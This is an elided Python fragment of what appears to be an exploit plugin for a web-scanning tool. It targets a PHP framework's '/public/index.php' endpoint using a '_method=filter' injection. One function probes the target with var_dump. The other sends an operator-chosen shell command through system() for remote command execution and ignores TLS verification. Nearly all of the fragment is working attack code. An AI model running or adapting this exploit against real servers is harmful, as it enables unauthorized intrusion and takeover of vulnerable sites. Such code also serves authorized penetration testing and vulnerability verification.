...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        rp = requests.get(url + "/public/index.php",data="c=var_dump&f=xiaohei&_method=filter",headers=heads,verify=False)
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='cmd':
            rp = requests.get(url + "/public/index.php",data="c=system&f="+exp_data['command']+"&_method=filter",headers=heads,verify=False)
            if  rp.text!="":
                result['Result'] = True
